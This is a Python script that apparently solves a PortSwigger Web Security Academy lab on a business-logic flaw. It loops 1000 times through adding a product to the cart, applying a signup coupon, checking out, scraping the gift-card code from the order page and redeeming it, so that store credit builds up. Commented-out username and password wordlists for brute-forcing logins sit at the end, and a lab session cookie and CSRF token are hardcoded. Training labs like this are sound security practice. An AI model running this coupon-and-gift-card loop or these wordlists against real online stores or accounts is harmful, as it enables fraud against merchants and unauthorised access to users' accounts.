import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
from urllib.parse import quote
from bs4 import BeautifulSoup
import time


origin_url = "https://0a0b00ca03cebb9f8030d56600fc000d.web-security-academy.net"
cookies = {'session':'elFBybY1BnHqebciwjrbkbibrL0Q8CCQ'}
csrf = "dWOvzs4zLwakWsztdttphBroNCNRDtJr"

data = {
    "productId":"2", "redir":"PRODUCT", "quantity":"1"
}
data1 = {
    "csrf":csrf, "coupon":"SIGNUP30"
}
data2 = {
    "csrf":csrf
}
data3 = {
    "csrf":csrf, "gift-card":"uZQ6dNaTp6"
}
# proxies = {"https":"https://10.148.14.85:8080", "http":"http://10.148.14.85:8080"}

sessions = requests.Session()
def make_request():
    # add item to cart
    url = origin_url + "/cart"
    r = sessions.post(url,cookies=cookies,data=data)
    time.sleep(1) # wait to avoid rate limiting/timeouts
    if not r.text:
        return
    print(f"Added to cart code: {r.status_code}")
    
    # apply coupon
    url = origin_url + "/cart/coupon"
    r = sessions.post(url,data=data1,cookies=cookies)
    time.sleep(1) # wait to avoid rate limiting/timeouts
    if not r.text:
        return
    print(f"Coupon applied code: {r.status_code}")

    # place order
    url = origin_url + "/cart/checkout"
    r = sessions.post(url,cookies=cookies,data=data2)
    time.sleep(1) # wait to avoid rate limiting/timeouts
    soup = BeautifulSoup(r.text, "html.parser")
    table = soup.find("table", {"class": "is-table-numbers"})
    code = table.find("td")
    print(code)
    code = code.text.strip() #strip whitespace/newline
    print(f"Order placed, gift card code: {code} code: {r.status_code}")
    
    # Redeem Gift Card
    url = origin_url + "/gift-card"
    data3["gift-card"] = code
    r = sessions.post(url,cookies=cookies,data=data3)
    print(f"Gift card redeemed code: {r.status_code}")

for i in range(1000):
    make_request()

# usernames = ["carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user", "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user", "vagrant", "azureuser", "academico", "acceso", "access", "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin", "administracion", "administrador", "administrator", "administrators", "admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai", "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind", "am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce", "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app", "app01", "app1", "apple", "application", "applications", "apps", "appserver", "aq", "ar", "archie", "arcsight", "argentina", "arizona", "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena", "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto", "autodiscover"]
# passwords = ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]


1763740544802 
